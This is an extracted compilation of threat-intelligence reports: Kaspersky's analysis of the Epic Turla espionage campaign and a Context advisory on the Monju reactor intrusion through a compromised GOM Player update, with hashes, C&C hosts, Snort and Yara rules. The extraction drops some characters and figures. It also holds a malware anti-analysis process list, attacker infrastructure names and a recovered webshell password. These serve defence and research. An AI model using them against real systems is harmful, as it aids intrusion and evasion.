10   https://www.fireeye.com/blog/threat-research/2014/08/connecting-the-dots-syrian-malware-team-uses-blackworm-
for-attacks.html
11   https://citizenlab.org/2014/03/maliciously-repackaged-psiphon/
     https://www.eff.org/document/quantum-surveillance-familiar-actors-and-possible-false-flags-syrian-malware-
campaigns
     http://www.birminghammail.co.uk/news/midlands-news/birmingham-hacker-junaid-hussain-syria-7291864
     http://www.dailymail.co.uk/news/article-2166850/Junaid-Hussain-Team-Poison-hacker-18-published-Tony-Blairs-
address-book-online-faces-jail.html
     The most recent Citizen Lab report on this topic is Communities @ Risk, which details a four-year long study of targeted
digital threats against ten civil society organizations. https://targetedthreats.net
The Epic Turla Operation
    Technical Appendix with IOCs
Executive Summary
Over the last 10 months, Kaspersky Lab researchers have analyzed a massive cyber-espionage operation
which we call "Epic Turla". The attackers behind Epic Turla have infected several hundred computers in
more than 45 countries, including government institutions, embassies, military, education, research and
pharmaceutical companies.
The attacks are known to have used at least two zero-day exploits:
      CVE-2013-5065 - Privilege escalation vulnerability in Windows XP and Windows 2003
      CVE-2013-3346 - Arbitrary code-execution vulnerability in Adobe Reader
We also observed exploits against older (patched) vulnerabilities, social engineering techniques and
watering hole strategies in these attacks. The primary backdoor used in the Epic attacks is also known as
"WorldCupSec", "TadjMakhal", "Wipbot" or "Tavdig".
When G-Data published on Turla/Uroburos back in February, several questions remained unanswered.
One big unknown was the infection vector for Turla (aka Snake or Uroburos). Our analysis indicates that
victims are infected via a sophisticated multi-stage attack, which begins with the Epic Turla. In time, as
the attackers gain confidence, this is upgraded to more sophisticated backdoors, such as the
Carbon/Cobra system. Sometimes, both backdoors are run in tandem, and used to "rescue" each other if
communications are lost with one of the backdoors.
Once the attackers obtain the necessary credentials without the victim noticing, they deploy the rootkit
and other extreme persistence mechanisms.
The attacks are still ongoing as of July 2014, actively targeting users in Europe and the Middle East.
Note: A full analysis of the Epic attacks is available to the Kaspersky Intelligent Services
subscribers. Contact: intelreports@kaspersky.com
The Epic Turla attacks
The attacks in this campaign fall into several different categories depending on the vector used in the
initial compromise:
      Spearphishing e-mails with Adobe PDF exploits (CVE-2013-3346 + CVE-2013-5065)
      Social engineering to trick the user into running malware installers with ".SCR" extension,
      sometimes packed with RAR
      Watering hole attacks using Java exploits (CVE-2012-1723), Flash exploits (unknown) or Internet
      Explorer 6,7,8 exploits (unknown)
      Watering hole attacks that rely on social engineering to trick the user into running fake "Flash
      Player" malware installers
The attackers use both direct spearphishing and watering hole attacks to infect their victims. Watering
holes (waterholes) are websites of interest to the victims that have been compromised by the attackers and
injected to serve malicious code.
So far we haven't been able to locate any e-mail used against the victims, only the attachments. The PDF
attachments do not show any "lure" to the victim when opened, however, the SCR packages sometime
show a clean PDF upon successful installation.
Some of known attachment names used in the spearphishing attacks are:
      
.rar (translation from Arabic: "Geneva conference.rar")
      NATO position on Syria.scr
      Note_
107-41D.pdf
      Talking Points.scr
      border_security_protocol.rar
      Security protocol.scr
      Program.scr
In some cases, these filenames can provide clues about the type of victims the attackers are targeting.
The watering hole attacks
Currently, the Epic attackers run a vast network of watering holes that target visitors with surgical
precision.
Some of the injected websites include:
The website of the City Hall of Pinor, Spain
A site promoting entrepreneurship in the border area of Romania
Palestinian Authority Ministry of Foreign Affairs
In total, we observed more than 100 injected websites. Currently, the largest number of injected sites is in
Romania.
Here's a statistic on the injected websites:
The distribution is obviously not random, and it reflects some of the interests of the attackers. For
instance, in Romania many of the infected sites are in the Mures region, while many of the Spanish
infected sites belong to local governments (City Hall).
Most of the infected sites use the TYPO3 CMS (see: http://typo3.org/), which could indicate the attackers
are abusing a specific vulnerability in this publishing platform.
Injected websites load a remote JavaScript into the victim's browser:
The script "sitenavigatoin.js" is a Pinlady-style browser and plugin detection script, which in turn,
redirects to a PHP script sometimes called main.php or wreq.php. Sometimes, the attackers register the
.JPG extension with the PHP handler on the server, using "JPG" files to run PHP scripts:
Profiling script
The main exploitation script "wreq.php", "main.php" or "main.jpg" performs a numbers of tasks. We have
located several versions of this script which attempt various exploitation mechanisms.
One version of this script attempts to exploit Internet Explorer versions 6, 7 and 8:
Internet Explorer exploitation script
Unfortunately, the Internet Explorer exploits have not yet been retrieved.
Another more recent version attempts to exploit Oracle Sun Java and Adobe Flash Player:
Java and Flash Player exploitation scripts
Although the Flash Player exploits couldn't be retrieved, we did manage to obtain the Java exploits:
                      Name               MD5
                      allj.html          536eca0defc14eff0a38b64c74e03c79
                      allj.jar           f41077c4734ef27dec41c89223136cf8
                      allj64.html        15060a4b998d8e288589d31ccd230f86
                      allj64.jar         e481f5ea90d684e5986e70e6338539b4
                      lstj.jar           21cbc17b28126b88b954b3b123958b46
                      lstj.html          acae4a875cd160c015adfdea57bd62c4
The Java files exploit a popular vulnerability, CVE-2012-1723, in various configurations.
The payload dropped by these Java exploits is the following:
MD5: d7ca9cf72753df7392bfeea834bcf992
The Java exploit use a special loader that attempts to inject the final Epic backdoor payload into
explorer.exe. The backdoor extracted from the Java exploits has the following C&C hardcoded inside:
www.arshinmalalan[.]com/themes/v6/templates/css/in.php
This C&C is still online at the moment although it redirects to a currently suspended page at
"hxxp://busandcoachdirectory.com[.]au". For a full list of C&C servers, please see the Appendix.
The Epic Turla attackers are extremely dynamic in using exploits or different methods depending on what
is available at the moment. Most recently, we observed them using yet another technique coupled with
watering hole attacks. This takes advantage of social engineering to trick the user into running a fake
Flash Player (MD5: 030f5fdb78bfc1ce7b459d3cc2cf1877):
In at least one case, they tried to trick the user into downloading and running a fake Microsoft Security
Essentials app (MD5: 89b0f1a3a667e5cd43f5670e12dba411):
The fake application is signed by a valid digital certificate from Sysprint AG:
Serial number: 00 c0 a3 9e 33 ec 8b ea 47 72 de 4b dc b7 49 bb 95 Thumbprint: 24 21 58 64 f1 28 97 2b 26
22 17 2d ee 62 82 46 07 99 ca 46
Valid signature from Sysprint AG on Epic dropper
This file was distributed from the Ministry of Foreign Affairs of Tajikistan's website, at
"hxxp://mfa[.]tj/upload/security.php".
The file is a .NET application that contains an encrypted resource. This drops the malicious file with the
MD5 7731d42b043865559258464fe1c98513.
This is an Epic backdoor which connects to the following C&Cs, with a generic internal ID of 1156fd22-
3443-4344-c4ffff:
hxxp://homaxcompany[.]com/components/com_sitemap/
hxxp://www.hadilotfi[.]com/wp-content/themes/profile/
A full list with all the C&C server URLs that we recovered from the samples can be found in the technical
Appendix.
The Epic command-and-control infrastructure
The Epic backdoors are commanded by a huge network of hacked servers that deliver command and
control functionality.
The huge network commanded by the Epic Turla attackers serves multiple purposes. For instance, the
motherships function as both exploitation sites and command and control panels for the malware.
Here's how the big picture looks like:
Epic Turla lifecycle
The first level of command and control proxies generally talk to a second level of proxies, which in turn,
talk to the "mothership" server. The mothership server is generally a VPS, which runs the Control panel
software used to interact with the victims. The attackers operate the mothership using a network of
proxies and VPN servers for anonymity reasons. The mothership also work as the exploitation servers
used in the watering hole attacks, delivering Java, IE or fake applications to the victim.
We were able to get a copy of one of the motherships, which provided some insight into the operation.
It runs a control panel which is password protected:
Epic mothership control panel login
Once logged into the Control panel, the attackers can see a general overview of the system including the
number of interesting potential targets:
Epic control panel status overview
A very interesting file on the servers is task.css, where the attackers define the IP ranges they are
interested in. To change the file, they are using the "Task editor" from the menu. Depending on the
"tasks", they will decide whether to infect the visitors or not. In this case, we found they targeted two
ranges belonging to:
      "Country A" - Federal Government Network
      "Country B" - Government Telecommunications and Informatics Services Network
It should be noted though, the fact that the attackers were targeting these ranges doesn't necessarily mean
they also got infected. Some other unknown IPs were also observed in the targeting schedules.
There is also an "except.css" file where attackers log the reasons they didn't try to exploit certain visitors.
There are three possible values:
      TRY
      DON'T TRY -> Version of the browser and OS does not meet the conditions
      DON'T TRY -> (2012-09-19 10:02:04) - checktime < 60
These are the "don't meet the conditions" reasons observed in the logs:
      Windows 7 or 2008 R2
      MSIE 8.0
      Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR
      2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.1.4322; .NET4.0C; .NET4.0E)
      Adobe Shockwave 11.5.1.601
      Adobe Flash 10.3.181.14
      Adobe Reader 10.1.0.0
      Win Media Player 12.0.7601.17514
      Quick Time null
      MS Word null
      Java null
The Epic / Tavdig / Wipbot backdoor
For this first stage of the attack, the threat actor uses a custom backdoor. In some cases, the backdoor is
packaged together with the CVE-2013-5065 EoP exploit and heavily obfuscated. This makes the analysis
more difficult.
The CVE-2013-5065 exploit allows the backdoor to achieve administrator privileges on the system and run
unrestricted. This exploit only works on unpatched Microsoft Windows XP systems.
Other known detection names for the backdoor is Trojan.Wipbot (Symantec) or Tavdig.
The main backdoor is about 60KB in size and implements a C&C protocol on top of normal HTTP
requests. The communication protocol uses
requests in the C&C replies, which the malware decrypts and processes. The replies are sent back to the
C&C through the same channel.
The malware behavior is defined by a configuration block. The configuration block usually contains two
hard-coded C&C URLs. He have also seen one case where the configuration block contains just one URL.
The configuration can also be updated on the fly by the attackers, via the C&C.
The backdoor attempts to identify the following processes and, if found, it will terminate itself:
      tcpdump.exe
      windump.exe
      ethereal.exe
      wireshark.exe
      ettercap.exe
      snoop.exe
      dsniff.exe
It contains an internal unique ID, which is used to identify the victim to the C&C. Most samples, especially
old ones, have the ID 1156fd22-3443-4344-c4ffff. Once a victim is confirmed as "interesting", the
attackers upload another Epic backdoor which has a unique ID used to control this specific victim.
During the first C&C call, the backdoor sends a pack with the victim's system information. All further
information sent to the C&C is encrypted with a public key framework, making decryption impossible. The
commands from the C&C are encrypted in a simpler manner and can be decrypted if intercepted because
the secret key is hardcoded in the malware.
Through monitoring, we were able to capture a large amount of commands sent to the victims by the
attackers, providing an unique view into this operation. Here's a look at one of the encrypted server
replies:
Once a victim is infected and "checks in" with the server, the attackers send a template of commands:
Next, the attackers try to move through the victim's network using pre-defined or collected passwords:
Listing all .doc files recursively is also a common "theme":
In total, we have decoded several hundreds of these command packages delivered to the victims, providing
an unique insight into the inner workings of the attackers.
In addition to generic searches, some very specific lookups have been observed as well. These include
searches for:
      *NATO*.msg
      eu energy dialogue*.*
      EU*.msg
      Budapest*.msg
In this case, the attackers were interested to find e-mails related to "NATO", "Energy Dialogue within
European Unition" and so on.
For some of the C&C servers, the attackers implemented RSA encryption for the C&C logs, which makes it
impossible to decrypt them. This scheme was implemented in April 2014.
Lateral movement and upgrade to more sophisticated backdoors
Once a victim is compromised, the attackers upload several tools that are used for lateral movement.
One such tool observed in the attacks and saved as "C:\Documents and Settings\All users\Start
Menu\Programs\Startup\winsvclg.exe" is:
Name: winsvclg.exe
MD5: a3cbf6179d437909eb532b7319b3dafe
Compiled: Tue Oct 02 13:51:50 2012
This is a keylogger tool that creates %temp%\~DFD3O8.tmp. Note: the filename can change across
victims. On one Central Asian government's Ministry of Foreign Affairs victim system, the filename used
was "adobe32updt.exe".
In addition to these custom tools, we observed the usage of standard administration utilities. For instance,
another tool often uploaded by the attackers to the victim's machine is "winrs.exe":
Name: winrs.exe
MD5: 1369fee289fe7798a02cde100a5e91d8
This is an UPX packed binary, which contains the genuine "dnsquery.exe" tool from Microsoft, unpacked
MD5: c0c03b71684eb0545ef9182f5f9928ca.
In several cases, an interesting update has been observed -- a malware from a different, yet related family.
Size: 275,968 bytes
MD5: e9580b6b13822090db018c320e80865f
Compiled: Thu Nov 08 11:05:35 2012
another example:
Size: 218,112 bytes
MD5: 071d3b60ebec2095165b6879e41211f2
Compiled: Thu Nov 08 11:04:39 2012
This backdoor is more sophisticated and belongs to the next level of cyber-espionage tools called the
"Carbon system" or Cobra by the Turla attackers. Several plugins for the "Carbon system" are known to
exist.
Decoded configuration for e9580b6b13822090db018c320e80865f
Note: the command and control servers www.losguayaberos[.]com and
thebesttothbrushes[.]com have been sinkholed by Kaspersky Lab.
Other packages delivered to the victims include:
MD5: c7617251d523f3bc4189d53df1985ca9
MD5: 0f76ef2e6572befdc2ca1ca2ab15e5a1
These top level packages deploy both updated Epic backdoors and Turla Carbon system backdoors to
confirmed victims, effectively linking the Epic and Turla Carbon operations together.
The Turla Carbon dropper from these packages has the following properties:
MD5: cb1b68d9971c2353c2d6a8119c49b51f
This is called internally by the authors "Carbon System", part of the "Cobra" project, as it can be seen from
the debug path inside:
This acts as a dropper for the following modules, both 32 and 64 bit:
                MD5                                                     Resource number
                4c1017de62ea4788c7c8058a8f825a2d                        101
                43e896ede6fe025ee90f7f27c6d376a4                        102
                e6d1dcc6c2601e592f2b03f35b06fa8f                        104
                554450c1ecb925693fedbb9e56702646                        105
                df230db9bddf200b24d8744ad84d80e8                        161
                91a5594343b47462ebd6266a9c40abbe                        162
                244505129d96be57134cb00f27d4359c                        164
                4ae7e6011b550372d2a73ab3b4d67096                        165
The Carbon system is in essence an extensible platform, very similar to other attack platforms such as the
Tilded platform or the Flame platform. The plugins for the Carbon system can be easily recognized as they
always feature at least two exports named:
      ModuleStart
      ModuleStop
Carbon system plugin with characteristic exports
Several Epic backdoors appear to have been designed to work as Carbon system plugins as well - they
require a specialized loader to start in victim systems that do not have the Carbon system deployed.
Some modules have artifacts which indicate the Carbon system is already at version 3.x, although the
exact Carbon system version is very rarely seen in samples:
The author of the Carbon module above can be also seen in the code, as "gilg", which also authored several
other Turla modules.
We are planning to cover the Turla Carbon system with more details in a future report.
Language artifacts
The payload recovered from one of the mothership servers (at
newsforum.servehttp[.]com/wordpress/wp-includes/css/img/upload.php, MD5:
4dc22c1695d1f275c3b6e503a1b171f5, Compiled: Thu Sep 06 14:09:55 2012) contains two modules, a
loader/injector and a backdoor. Internally, the backdoor is named "Zagruzchick.dll":
The word "Zagruzchick" means "boot loader" in Russian.
The Control panel for the Epic motherships also sets the language to codepage "1251":
Codepage 1251 is commonly used to render Cyrillic characters.
There are other indications that the attackers are not native English language speakers:
      Password it
s wrong!
      Count successful more MAX
      File is not exists
      File is exists for edit
The sample e9580b6b13822090db018c320e80865f that was delivered to several Epic victims as an
upgraded backdoor, has the compilation code page language set to "LANG_RUSSIAN".
The threat actor behind the "Epic" operation uses mainly hacked servers to host their proxies. The hacked
servers are controlled through the use of a PHP webshell. This shell is password protected; the password is
checked against an MD5 hash:
The MD5 "af3e8be26c63c4dd066935629cf9bac8" has been solved by Kaspersky Lab as the
password "kenpachi". In February 2014 we observed the Miniduke threat actor using the same backdoor
on their hacked servers, although using a much stronger password.
Once again, it is also interesting to point out the usage of Codepage 1251 in the webshell, which is used to
render Cyrillic characters.
There appears to be several links between Turla and Miniduke, but we will leave that for a future blogpost.
Victim statistics
On some of the C&C servers used in the Epic attacks, we were able to identify detailed victim statistics,
which were saved for debugging purposes by the attackers.
This is the country distribution for the top 20 affected countries by victim's IP:
According to the public information available for the victims' IPs, targets of "Epic" belong to the following
categories:
      Government
              Ministry of interior (EU country)
              Ministry of trade and commerce (EU country)
              Ministry of foreign/external affairs (Asian country, EU country)
             Intelligence (Middle East, EU Country)
      Embassies
      Military (EU country)
      Education
      Research (Middle East)
      Pharmaceutical companies
      Unknown (impossible to determine based on IP/existing data)
Summary
When G-Data published their Turla paper, there were few details publicly available on how victims get
infected with this malware campaign. Our analysis indicates this is a sophisticated multi-stage infection;
which begins with Epic Turla. This is used to gain a foothold and validate the high profile victim. If the
victim is interesting, they get upgraded to the Turla Carbon system.
Most recently, we observed this attack against a Kaspersky Lab user on August 5, 2014, indicating the
operation remains fresh and ongoing.
Note: A full analysis of the Epic attacks is available to the Kaspersky Intelligent Services
customers. Contact: intelreports@kaspersky.com
We would like to add the following at the end of the blogpost, right before the detection names:
Further reading
If you'd like to read more about Turla/Uroburos, here's a few recommendations:
      G-Data's paper "Uroburos Highly complex espionage software with Russian roots"
      BAE Systems analysis of "The Snake campaign"
      "Uroburos: the snake rootkit", technical analysis by deresz and tecamac
      "TR-25 Analysis - Turla / Pfinet / Snake/ Uroburos" by CIRCL.LU
Kaspersky products' detection names for all the malware samples described in this post:
Backdoor.Win32.Turla.an
Backdoor.Win32.Turla.ao
Exploit.JS.CVE-2013-2729.a
Exploit.JS.Pdfka.gkx
Exploit.Java.CVE-2012-1723.eh
Exploit.Java.CVE-2012-1723.ou
Exploit.Java.CVE-2012-1723.ov
Exploit.Java.CVE-2012-1723.ow
Exploit.Java.CVE-2012-4681.at
Exploit.Java.CVE-2012-4681.au
Exploit.MSExcel.CVE-2009-3129.u
HEUR:Exploit.Java.CVE-2012-1723.gen
HEUR:Exploit.Java.CVE-2012-4681.gen
HEUR:Exploit.Java.Generic
HEUR:Exploit.Script.Generic
HEUR:Trojan.Script.Generic
HEUR:Trojan.Win32.Epiccosplay.gen
HEUR:Trojan.Win32.Generic
HackTool.Win32.Agent.vhs
HackTool.Win64.Agent.b
Rootkit.Win32.Turla.d
Trojan-Dropper.Win32.Dapato.dwua
Trojan-Dropper.Win32.Demp.rib
Trojan-Dropper.Win32.Injector.jtxs
Trojan-Dropper.Win32.Injector.jtxt
Trojan-Dropper.Win32.Injector.jznj
Trojan-Dropper.Win32.Injector.jznk
Trojan-Dropper.Win32.Injector.khqw
Trojan-Dropper.Win32.Injector.kkkc
Trojan-Dropper.Win32.Turla.b
Trojan-Dropper.Win32.Turla.d
Trojan.HTML.Epiccosplay.a
Trojan.Win32.Agent.iber
Trojan.Win32.Agent.ibgm
Trojan.Win32.Agentb.adzu
Trojan.Win32.Inject.iujx
Trojan.Win32.Nus.g
Trojan.Win32.Nus.h
    Technical Appendix with IOCs
                                                                 TLP: WHITE
Context Threat Intelligence
Threat Advisory
The Monju Incident
Context Ref.   TA10009
Author         Context Threat Intelligence (CTI)
Date           27/01/2014
Tel            +44 (0) 20 7537 7515
Fax            +44 (0) 20 7537 1071
Email          threat@contextis.co.uk
                                                   
 Context Information Security
                                                               TLP: WHITE
                                                                               E
                           TLP: WHITE
Contents
1 Distribution                                  3
2 Executive Summary                             4
3 The Monju Incident                            5
 3.1 Infection Vector                           5
 3.2 Malware                                    6
   3.2.1 Overview                               6
   3.2.2 Detection                              8
4 Appendix A 
 File Metadata                    9
                          TLP: WHITE    Page 2 / 11
                                    TLP: WHITE
1 Distribution
Context Information Security distribute Context Threat Intelligence (CTI) reporting under
the Traffic Light Protocol (TLP)[1], a method of classifying a document in order to promote
the distribution of sensitive information between individuals, organisations or
communities in a controlled and trusted way, based on the originator
s wishes.
The various levels of the TLP are represented by the following colours:
RED - Personal; for named recipients only
Sources may use TLP: RED when information cannot be effectively acted upon by
additional parties, and could lead to impacts on a party's privacy, reputation, or
operations if misused.
Recipients may not share TLP: RED information with any parties outside of the specific
exchange, meeting, or conversation in which it is originally disclosed. TLP: RED
information will be passed verbally or in person.
AMBER - Limited Distribution
Sources may use TLP: AMBER when information requires support to be effectively acted
upon, but carries risks to privacy, reputation, or operations if shared outside of the
organisations involved.
Recipients may only share TLP: AMBER information with members of their own
organisation who need to know, and only as widely as necessary to act on that
information.
GREEN 
 Community Wide
Sources may use TLP: GREEN when information is useful for the awareness of all
participating organisations as well as with peers within the broader community or sector.
Recipients may share TLP: GREEN information with peers and partner organisations within
their sector or community, but not via publicly accessible channels such as publication
or posting publicly on the Internet.
         - Unlimited Distribution
Sources may use TLP: WHITE when information carries minimal or no foreseeable risk of
misuse, in accordance with applicable rules and procedures for public release.
Subject to standard copyright rules, TLP: WHITE information may be distributed freely,
without restriction.
1   http://www.oecd.org/dataoecd/25/10/40761118.pdf
                                TLP: WHITE                                        Page 3 / 11
                             TLP: WHITE
2 Executive Summary
On 2nd January 2014 a Systems Administrator at the Monju fast breeder reactor facility in
Japan noticed suspicious connections emanating from a machine in the control room,
coinciding with what was a seemingly routine software update to a free media player.
Among other items, staff training documents and more than 40,000 emails were stored
on the machine and thought to be harvested by the attacker. The Japanese Atomic
Energy Agency is investigating further.
The attack appears to have been the result of the attackers having compromised the
GOM Player
 update server and having it act as a 
watering hole
, meaning that
machines which access the site are delivered malware. Gom Player originates in South
Korea and in some parts of Asia it is a popular alternative to Windows Media Player. It is
unclear whether every machine trying to download an update received this malware or
whether only machines which fitted a certain profile were infected.
Technical analysis of the implant on the compromised machine has shown it to be a
variant of a Trojan which has been in the wild for some years now and continues to be
effective. The 
Gh0st RAT
 has been used extensively in attacks linked to the Chinese
state, though it is important to remember that the code is publicly available and can be
modified and used by anyone. The targeting of a Japanese nuclear facility however, is
consistent with Chinese state intelligence requirements. If this is the work of a Chinese
group then we feel the targeting may go much further than the Civil Nuclear sector and
thus be of interest to the wider Energy Sector and industry as a whole.
In order to inform the Energy Sector and beyond about this attack, we have compiled a
technical summary of the attack and have provided a number of Indicators Of
Compromise (IOCs) which can be used to aid detection. It is likely that the attackers
would redeploy their implant against other targets, albeit with a delivery mechanism
more tailored to the location of the intended victims.
                            TLP: WHITE                                           Page 4 / 11
                                         TLP: WHITE
3 The Monju Incident
3.1 Infection Vector
Based on open source reporting, it appears that the intrusion took place via the
compromise of the GOM Player update server (app.gomlab.com), where attackers
may have gained entry via a PHP-based webshell, hidden within an image, present on
the host since October 2011[2].
The observed malicious activity relates to the modification of a file that controls GOM
Player updates, spanning the date range 27th December 2013 to 16th January 2014,
during which time these alterations are reported to have only manifested themselves for
visitors on certain IP ranges; evidence supporting this claim has not yet been made
public. If this was indeed the case, then the nature of this attack is certainly more
targeted than one that would cover the entire userbase of the GOM Player product,
with victims comprising of the Japanese Government in addition to those at the Monju
nuclear facility.
The modified file redirected the GOM Player update process to another compromised
server (www.fudousankaitori.jp (203.189.101.35)), where a file containing both the
legitimate update and the malware was deliver to the victim.
                                                                      Modified
                                                                     Update URL
                                                                                                      app.gomlab.com
                                                        GOM Player
                                                       Upd ate Requ est
                               1
                                                GOM Update
                                     2        Download Request
                                                                                  GOM Player and
                                                                                    Malware
          Victim                          3                                                        www.fudousankaitori.jp
                                                              Malware Command
                                                                 And Control
       Key
               Compromised Server
               Attacker Infrastructure                                                                 testqweasd.tk
     A diagram illustrating the modified flow of the GOM Player update process which led to the compromise
2   http://hummingbird.tistory.com/5187
                                         TLP: WHITE                                                                Page 5 / 11
                                                   TLP: WHITE
3.2 Malware
3.2.1 Overview
Deployed to the system via a compressed bundle containing the official GOM Player
setup binary and a self-extracting RAR archive containing the malicious files, the
malware consists of a number of individual pieces. Upon extraction from the RAR
archive, the installer component (0ae82fd94836815a1e8d284ccb75109d) is
automatically launched alongside the GOM Player update, distracting victims from the
malicious activity taking place.
The installer component is referred to by the author as 
miansha' which, according to an
East Asia Cyber Threat Intelligence Researcher, is likely Mi
), a phrase
commonly used by People
s Republic of China (PRC) hackers to mean 
anti Antivirus
detection
 or 
Antivirus avoidance
; Symantec[3] have named the detection for this
code 
Backdoor.Miancha
, where Mi
, likely shorthand for 
) similarly
means 
Antivirus avoidance
. The installer is responsible for the malware persistence
mechanism, adding entries to the registry in the following locations, depending on
Windows Version:
Miancha Persistence Registry Keys
Windows Vista and later                     HKEY_USERS\.default\Software\Classes\CLSID\{ECD4FC4D-
                                            5213-11D0-B792-00A0C90312E1}\InProcServer32\@ =
                                            expand:"C:\WINDOWS\temp\install.ocx"
Prior to Windows Vista                      HKEY_USERS\.default\Software\Classes\CLSID\{B12AE898-
                                            D056-4378-A844-6D393FE37956}\InProcServer32\@ =
                                            expand:"C:\WINDOWS\temp\install.ocx"
The installer will also determine the system architecture (32- or 64-bit) and then
deobfuscate the relevant loader DLL to the path 
C:\Windows\temp\install.ocx
ensuring the malware is launched on system start-up. Oddly, this file is padded with null
bytes, resulting in a 25 megabyte file.
                                                Repackaged Update
           GoMPLAYERJPSETUP.EXE (a9225e059d9dace1b259bceec7f48dae)
                                       Real GOM Player Installer        Self-extracting RAR Archive containing Malware
    GOMPLAYERJPSETUP_JP.EXE (1ff3b3628e40f0215afacf482ba17782)          GOMPLAYERBETASETUP_JP.exe (db79a93448acac8786581858f3edc36a)
                                           Obfuscated Malware Loaders
                                                                               Malicious Installer
                          dll.tmp (d5548e1913950a42a04debcac4222bd2)
                                                                               install.exe (0ae82fd94836815a1e8d284ccb75109d)
                       dll64.tmp (01f7b465242237bd3d31d39767aa68e0)
                                                                         Obfuscated Implant Code
                                                                         instructions.pdf (569071c45f47b7fb7a75f30bc07d5739)
                                                                         instructions64.pdf (55474f8e26f2b6fc3b5d78ce9a77b0b0)
                                          The deployment chain of the Miancha Gh0st variant
3   http://www.symantec.com/security_response/writeup.jsp?docid=2014-012407-3922-99
                                                 TLP: WHITE                                                                  Page 6 / 11
                              TLP: WHITE
The main implant code is stored in files named instructions.pdf and instructions64.pdf;
not PDF documents but instead DLLs obfuscated with a one-byte XOR with 0x14, similar
to the malware loader DLLs. The loader, referred to by the malware author as 
 (shell),
reads and deobfuscates the main implant code which then communicates with the
attacker-controlled server at testqweasd.tk (211.43.220.89) on TCP port 443. The main
implant code is referred to as 
Black on White
), a term used in the PRC hacking
community to denote the act of Antivirus avoidance through the loading of malicious
black
 code via non-malicious or trusted 
white
 code. This is a practice recently
illustrated through the deployment of the PlugX trojan, utilising DLL load order hijacking
alongside a signed (trusted) executable.
Analysis of this malware revealed it to be a variant of the Gh0st RAT, often used by
Chinese actors (including those who are state-motivated or directly state-sponsored).
This specific variant shows similarities to that used during the VOHO campaign[4], where
Gh0st RAT was spread via watering hole attacks utilising vulnerable websites belonging
to financial services and technology companies. Specifically, the initial five bytes of the
communications (often used to denote a campaign or victim) are 
HTTPS
, amended
from the original 
Gh0st
; the same as the traffic produced by the VOHO Gh0st variant.
In addition to delivering system-specific details back to the attacker, Gh0st RAT provides
the capability to deploy additional malware, enabling the harvesting of sensitive data
and enabling the further propagation throughout the infected network.
4   https://blogs.rsa.com/voho-apt-campaign-update/
                             TLP: WHITE                                            Page 7 / 11
                             TLP: WHITE
3.2.2 Detection
To enable rapid response, the following Snort signature can be deployed:
alert tcp $HOME_NET any -> $EXTERNAL_NET 53,80,443,1080 (msg:"gh0st RAT 'HTTPS' variant
(aka Backdoor.Miancha)"; flow:established,to_server; content:"HTTPS"; depth:5; rawbytes;
classtype:trojan-activity; sid:xxx; rev:1;)
Additionally, the following Yara signature should identify both encoded payloads and
the active implant in memory:
rule Trojan_W32_Gh0stMiancha_1_0_0
   strings:
       $0x = { 57 5b 5a 5a 51 57 40 34 31 67 2e 31 70 34 5c 40 40 44 3b 25 3a 19   1e   5c   7b
67 60 2e 34 31 67 2e 31 70 19 1e 55 77 77 71 64 60 2e 34 3e 3b 3e 19 1e 57 7b 7a   60   71   7a
60 39 40 6d 64 71 2e 34 60 71 6c 60 3b 7c 60 79 78 19 1e 44 66 7b 6c 6d 39 57 7b   7a   7a   71
77 60 7d 7b 7a 2e 34 5f 71 71 64 39 55 78 7d 62 71 19 1e 57 7b 7a 60 71 7a 60 39   78   71   7a
73 60 7c 2e 34 24 19 1e 19 1e }
       $1 = { 5c e7 99 bd e5 8a a0 e9 bb 91 5c }
       $1x = { 48 f3 8d a9 f1 9e b4 fd af 85 48 }
       $2 = "DllCanLoadNow"
       $2x = { 50 78 78 57 75 7a 58 7b 75 70 5a 7b 63 }
       $3x = { 5a 61 79 76 71 66 34 7b 72 34 67 61 76 7f 71 6d 67 2e 34 31 70 }
       $4 = "JXNcc2hlbGxcb3Blblxjb21tYW5k"
       $4x = { 5e 4c 5a 77 77 26 7c 78 76 53 6c 77 76 27 56 78 76 78 6c 7e 76 26   25 60 4d
43 21 7f }
       $5 = "SEFSRFdBUkVcREVTQ1JJUFRJT05cU3lzdGVtXENlbnRyYWxQcm9jZXNzb3JcMA=="
       $5x = { 47 51 52 47 46 52 70 56 41 7f 42 77 46 51 42 40 45 25 5e 5e 41 52   46 5e 40
24 21 77 41 27 78 6e 70 53 42 60 4c 51 5a 78 76 7a 46 6d 4d 43 6c 45 77 79 2d 7e   4e 4c 5a
6e 76 27 5e 77 59 55 29 29 }
       $6 = "C:\\Users\\why\\"
       $6x = { 57 2e 48 41 67 71 66 67 48 63 7c 6d 48 }
       $7 = "g:\\ykcx\\"
       $7x = { 73 2E 48 6D 7F 77 6C 48 }
       $8 = "(miansha)"
       $8x = { 3C 79 7D 75 7A 67 7C 75 3D }
       $9 = "server(\xE5\xA3\xB3)"
       $9x = { 7C 2E 48 26 24 25 27 3A 25 25 3A 26 21 48 67 71 66 62 71 66 3C F1   B7 A7 3D
48 46 71 78 71 75 67 71 48 67 71 66 62 71 66 3A 64 70 76 }
       $cfgDecode = { 8a ?? ?? 80 c2 7a 80 f2 19 88 ?? ?? 41 3b ce 7c ??}
   condition:
       any of them
                            TLP: WHITE                                             Page 8 / 11
                                  TLP: WHITE
4 Appendix A 
 File Metadata
Gh0stMiancha Installer
MD5                     0ae82fd94836815a1e8d284ccb75109d
SHA1                    bcba2a4d55d860f0bca3b9f80a5deb2dd69f000c
SHA256                  b2f9e2f7c07235a6ea03e90ba591f0a43d38d8ff8ee6583473b6fbb63831619d
Size (bytes)            13314
Compile Time            2013-11-22 12:19:48 UTC
In-the-wild Filenames   install.exe
PDB String              g:\ykcx\install(miansha)\Release\install.pdb
Obfuscated TrojanLoader:W32/Gh0stMiancha
MD5                     d5548e1913950a42a04debcac4222bd2
SHA1                    ac48bc2deefd30dad762a23e85409a7eec48b723
SHA256                  3d43f7fab3c8f574e2790c2d97f85fa87f0d53e412c995462e53348b4fc34b74
Size (bytes)            10299
Compile Time            N/A
In-the-wild Filenames   dll.tmp
TrojanLoader:W32/Gh0stMiancha
MD5                     04e7361323b431f7c9f86388f316bbea
SHA1                    e3c095c7ace563b41b3f4310f3de69e47c86fd03
SHA256                  73ef70f1e80e32341eebcb3b1084cf896f6b1aa701b7a6c7abcb9293500d84ae
Size (bytes)            10299
Compile Time            2013-11-26 09:34:10 UTC
In-the-wild Filenames   install.ocx
PDB String              h:\2013.11.25\server(
)\Release\server.pdb
